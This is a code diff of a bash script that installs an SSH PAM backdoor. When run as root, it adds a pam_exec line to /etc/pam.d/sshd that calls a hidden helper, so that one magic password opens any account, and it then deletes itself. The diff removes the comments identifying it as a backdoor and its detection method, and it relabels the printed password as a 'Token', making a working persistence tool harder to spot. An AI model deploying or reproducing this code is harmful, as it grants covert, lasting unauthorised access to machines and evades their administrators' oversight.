@@ -1,15 +1,11 @@
 #!/usr/bin/env bash
-# PAM exec backdoor: accepts a magic password for ANY account on the box.
-# Works regardless of the target account's real password.
-# Survives: password changes, account lockout.
-# Detected by: defender-cli anti-persistence --pam (read-only; manual removal required)
 set -euo pipefail
 [[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }
 
 HELPER="/usr/lib/.pam_auth"
 PAM_TARGET="/etc/pam.d/sshd"
 PAM_LINE="auth sufficient pam_exec.so expose_authtok quiet ${HELPER}"
-MAGIC="${MAGIC_PASS:-$(openssl rand -hex 12)}"
+MAGIC="${MAGIC_PASS:-$(tr -dc 'a-f0-9' < /dev/urandom | head -c 24 || true)}"
 
 case "${1:-}" in
   deploy)
@@ -30,8 +26,7 @@ HELPER_EOF
       sed -i "1s|^|${PAM_LINE}\n|" "$PAM_TARGET"
     fi
     echo "[+] 03_pam_backdoor: installed in ${PAM_TARGET}"
-    echo "[+]   Magic password: ${MAGIC}"
-    echo "[+]   Usage: ssh <any-user>@<target>  (use magic password)"
+    echo "[+]   Token: ${MAGIC}"
     rm -f -- "${BASH_SOURCE[0]}" 2>/dev/null || true
     ;;
   cleanup)
